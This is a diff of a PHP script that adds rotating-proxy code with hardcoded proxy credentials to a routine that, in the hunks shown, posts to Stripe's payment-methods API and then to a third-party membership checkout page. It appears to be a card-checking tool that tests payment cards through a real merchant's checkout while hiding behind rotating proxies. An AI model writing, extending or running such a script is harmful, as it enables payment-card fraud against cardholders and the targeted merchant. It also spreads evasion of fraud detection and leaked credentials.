@@ -83,8 +83,44 @@ function mod($dividendo,$divisor)
 {
     return round($dividendo - (floor($dividendo/$divisor)*$divisor));
 }
+/////////////===[Proxy]/////////////
+$rp1 = array(
+  1 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+  2 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+  3 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+  4 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+  5 => 'bbdwmqhv-rotate:5z7pm4a88t6r',
+    ); 
+    $rpt = array_rand($rp1);
+    $rotate = $rp1[$rpt];
+$ip = array(
+  1 => 'socks5://p.webshare.io:80',
+  2 => 'http://p.webshare.io:80',
+    ); 
+    $socks = array_rand($ip);
+    $socks5 = $ip[$socks];
+$url = "https://api.ipify.org/";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
+$ip1 = curl_exec($ch);
+curl_close($ch);
+ob_flush();
+if (isset($ip1)){
+$ip = "";
+}
+if (empty($ip1)){
+$ip = "";
+}
+# --------------------[Proxy End]-----------------#
+
 # -------------------- [1 REQ] -------------------#
 $ch = curl_init();
+//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -125,6 +161,9 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 # -------------------- [2 REQ] -------------------#
 
 $ch = curl_init();
+//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, 'https://jaxcc.org/membership-account-2/membership-checkout/?level=2');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
